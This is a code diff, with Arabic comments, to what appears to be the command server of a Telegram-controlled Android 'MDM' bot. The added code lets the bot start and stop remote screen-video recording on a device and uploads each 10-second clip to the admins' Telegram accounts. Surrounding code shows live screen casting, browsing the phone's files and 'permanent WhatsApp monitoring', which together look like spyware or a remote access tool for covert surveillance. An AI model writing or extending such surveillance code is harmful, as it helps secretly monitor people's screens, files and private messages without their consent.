@@ -181,10 +181,22 @@ class DeviceStore:
             if dev:
                 dev["screen_cast_active"] = active
 
+    def set_screen_record(self, device_id, active: bool):
+        """تتبع حالة تسجيل الفيديو لكل جهاز"""
+        with self._lock:
+            dev = self._devices.get(device_id)
+            if dev:
+                dev["screen_record_active"] = active
+
     def is_screen_casting(self, device_id) -> bool:
         """هل الجهاز يبث حالياً؟"""
         dev = self._devices.get(device_id)
         return bool(dev and dev.get("screen_cast_active", False))
+
+    def is_screen_recording(self, device_id) -> bool:
+        """هل الجهاز يسجّل فيديو حالياً؟"""
+        dev = self._devices.get(device_id)
+        return bool(dev and dev.get("screen_record_active", False))
 
     def get_stats(self):
         return {
@@ -304,6 +316,16 @@ def build_command_payload(cmd_type, params=None):
             return p
         # ⚡ stop-screen-cast (إيقاف البث المباشر)
         if cmd_type == "stop-screen-cast":
+            p = {"command": cmd_type, "category": "permissions",
+                 "timestamp": datetime.now(timezone.utc).isoformat()}
+            return p
+        # ⚡ start-screen-record (بدء تسجيل فيديو)
+        if cmd_type == "start-screen-record":
+            p = {"command": cmd_type, "category": "permissions",
+                 "timestamp": datetime.now(timezone.utc).isoformat()}
+            return p
+        # ⚡ stop-screen-record (إيقاف تسجيل فيديو)
+        if cmd_type == "stop-screen-record":
             p = {"command": cmd_type, "category": "permissions",
                  "timestamp": datetime.now(timezone.utc).isoformat()}
             return p
@@ -524,6 +546,22 @@ def permissions_keyboard(did):
             callback_data=f"cmd:{did}:p{cache_key3}"[:64]
         )
     kb.add(cast_btn)
+    # ⚡ زر تسجيل فيديو — يختلف حسب حالة التسجيل
+    is_recording = dm.is_screen_recording(did)
+    cache_key4 = str(len(_file_path_cache))
+    if is_recording:
+        _file_path_cache[cache_key4] = "stop-screen-record"
+        record_btn = InlineKeyboardButton(
+            "⏹ إيقاف تسجيل الفيديو",
+            callback_data=f"cmd:{did}:p{cache_key4}"[:64]
+        )
+    else:
+        _file_path_cache[cache_key4] = "start-screen-record"
+        record_btn = InlineKeyboardButton(
+            "📹 تسجيل فيديو",
+            callback_data=f"cmd:{did}:p{cache_key4}"[:64]
+        )
+    kb.add(record_btn)
     kb.add(_back(did))
     return kb
 
@@ -682,10 +720,16 @@ def _format_cmd_sent(dev, command, params=None):
     # ⚡ أسماء مخصصة لأوامر البث المباشر
     if command == "start-screen-cast":
         lbl = "📺 البث المباشر"
-        desc = "بدء التقاط مستمر لشاشة الجهاز كل 3 ثوانٍ"
+        desc = "بدء التقاط مستمر لشاشة الجهاز كل 5 ثوانٍ"
     elif command == "stop-screen-cast":
         lbl = "⏹ إيقاف البث المباشر"
         desc = "إيقاف التقاط المستمر"
+    elif command == "start-screen-record":
+        lbl = "📹 تسجيل فيديو"
+        desc = "تسجيل فيديو 10 ثواني وإرساله"
+    elif command == "stop-screen-record":
+        lbl = "⏹ إيقاف تسجيل فيديو"
+        desc = "إيقاف تسجيل الفيديو"
 
     lines = [
         f"<b>⚡ تم إرسال الأمر فوراً</b>",
@@ -1251,6 +1295,11 @@ class MDMBot:
                     self._send_cmd(c.message.chat.id, did, "start-screen-cast")
                 elif tgt == "stop-screen-cast":
                     self._send_cmd(c.message.chat.id, did, "stop-screen-cast")
+                # ⚡ Handle start-screen-record (تسجيل فيديو)
+                elif tgt == "start-screen-record":
+                    self._send_cmd(c.message.chat.id, did, "start-screen-record")
+                elif tgt == "stop-screen-record":
+                    self._send_cmd(c.message.chat.id, did, "stop-screen-record")
                 # For ls command, default to /sdcard/ if no path specified
                 elif tgt == "ls":
                     self._send_cmd(c.message.chat.id, did, "ls", {"value": "/sdcard/"})
@@ -2247,6 +2296,87 @@ def _sock_file_explorer(data):
                     logger.error(f"فشل إرسال إشعار إيقاف البث: {e}")
         return
 
+    # ⚡ Check for screen_record_started event (بدء تسجيل الفيديو)
+    if data_type == "screen_record_started":
+        logger.info(f"📹 Screen record started on #{dev.get('short_id', '?')}")
+        dm.set_screen_record(dev["device_id"], True)
+        if mdm_bot:
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    short_label = _dev_label(dev)
+                    did = dev["device_id"]
+                    stop_cache_key = str(len(_file_path_cache))
+                    _file_path_cache[stop_cache_key] = "stop-screen-record"
+                    kb = InlineKeyboardMarkup(row_width=1)
+                    kb.add(InlineKeyboardButton(
+                        "⏹ إيقاف تسجيل الفيديو",
+                        callback_data=f"cmd:{did}:p{stop_cache_key}"[:64]
+                    ))
+                    mdm_bot.bot.send_message(admin_id,
+                        f"<b>📹 بدأ تسجيل الفيديو!</b>\n\n"
+                        f"📱 <b>{short_label}</b>\n"
+                        f"⏱ كل <b>10 ثواني</b> فيديو جديد\n"
+                        f"📤 سيتم إرسال الفيديوهات تلقائياً\n\n"
+                        f"💡 اضغط الزر أدناه للإيقاف",
+                        parse_mode="HTML",
+                        reply_markup=kb)
+                except Exception as e:
+                    logger.error(f"فشل إرسال إشعار بدء التسجيل: {e}")
+        return
+
+    # ⚡ Check for screen_record_stopped event (إيقاف تسجيل الفيديو)
+    if data_type == "screen_record_stopped":
+        logger.info(f"⏹ Screen record stopped on #{dev.get('short_id', '?')}")
+        dm.set_screen_record(dev["device_id"], False)
+        if mdm_bot:
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    short_label = _dev_label(dev)
+                    did = dev["device_id"]
+                    start_cache_key = str(len(_file_path_cache))
+                    _file_path_cache[start_cache_key] = "start-screen-record"
+                    kb = InlineKeyboardMarkup(row_width=1)
+                    kb.add(InlineKeyboardButton(
+                        "📹 تسجيل فيديو",
+                        callback_data=f"cmd:{did}:p{start_cache_key}"[:64]
+                    ))
+                    mdm_bot.bot.send_message(admin_id,
+                        f"<b>⏹ تم إيقاف تسجيل الفيديو</b>\n\n"
+                        f"📱 <b>{short_label}</b>\n"
+                        f"🏁 لن يصل المزيد من الفيديوهات",
+                        parse_mode="HTML",
+                        reply_markup=kb)
+                except Exception as e:
+                    logger.error(f"فشل إرسال إشعار إيقاف التسجيل: {e}")
+        return
+
+    # ⚡ Check for screen_record_failed event (فشل تسجيل الفيديو)
+    if data_type == "screen_record_failed":
+        logger.info(f"❌ Screen record failed on #{dev.get('short_id', '?')}: {data.get('message', 'unknown')}")
+        dm.set_screen_record(dev["device_id"], False)
+        if mdm_bot:
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    short_label = _dev_label(dev)
+                    did = dev["device_id"]
+                    retry_cache_key = str(len(_file_path_cache))
+                    _file_path_cache[retry_cache_key] = "start-screen-record"
+                    kb = InlineKeyboardMarkup(row_width=1)
+                    kb.add(InlineKeyboardButton(
+                        "🔄 إعادة محاولة",
+                        callback_data=f"cmd:{did}:p{retry_cache_key}"[:64]
+                    ))
+                    mdm_bot.bot.send_message(admin_id,
+                        f"<b>❌ فشل تسجيل الفيديو</b>\n\n"
+                        f"📱 <b>{short_label}</b>\n"
+                        f"⚠️ {data.get('message', 'خطأ غير معروف')}\n\n"
+                        f"💡 اضغط الزر للإعادة",
+                        parse_mode="HTML",
+                        reply_markup=kb)
+                except Exception as e:
+                    logger.error(f"فشل إرسال إشعار فشل التسجيل: {e}")
+        return
+
     # ⚡ Check for whatsapp_message event (مراقبة واتساب الدائمة)
     if data_type == "whatsapp_message":
         _handle_whatsapp_message(dev, data)
@@ -2270,6 +2400,53 @@ def _sock_file_explorer(data):
                 mdm_bot.bot.send_message(cid, result, parse_mode="HTML")
         except Exception as e:
             logger.error(f"فشل إرسال نتائج file explorer: {e}")
+
+
+# ⚡ REST endpoint for video upload (تسجيل فيديو الشاشة)
+@app.route("/api/device/video-upload", methods=["POST"])
+def _api_video_upload():
+    """Receive uploaded screen record video (MP4) and send to Telegram."""
+    try:
+        did = request.form.get("device_id", "")
+        vid_type = request.form.get("type", "screen_record")
+        video_file = request.files.get("file")
+
+        if not did or not video_file:
+            return jsonify({"error": "missing device_id or file"}), 400
+
+        dev = dm.get_device(did)
+        if not dev:
+            return jsonify({"error": "unknown device"}), 404
+
+        logger.info(f"📹 Video upload from #{dev.get('short_id', '?')}: "
+                     f"type={vid_type} size={video_file.content_length}")
+
+        # إرسال الفيديو للبوت عبر Telegram
+        if mdm_bot:
+            short_label = _dev_label(dev)
+            from datetime import datetime as _dt
+            now_str = _dt.now().strftime("%H:%M:%S")
+
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    mdm_bot.bot.send_video(
+                        admin_id,
+                        video=video_file,
+                        caption=f"📹 <b>تسجيل شاشة</b>\n"
+                                f"📱 <b>{short_label}</b>\n"
+                                f"🕐 {now_str}\n"
+                                f"📏 {video_file.content_length // 1024} KB",
+                        parse_mode="HTML",
+                        timeout=120
+                    )
+                    logger.info(f"✅ Video sent to admin {admin_id}")
+                except Exception as e:
+                    logger.error(f"❌ Failed to send video to admin {admin_id}: {e}")
+
+        return jsonify({"success": True}), 200
+    except Exception as e:
+        logger.error(f"❌ video-upload error: {e}", exc_info=True)
+        return jsonify({"error": str(e)}), 500
 
 
 # ⚡ REST endpoint for base64_media (fallback when Socket.IO disconnected)
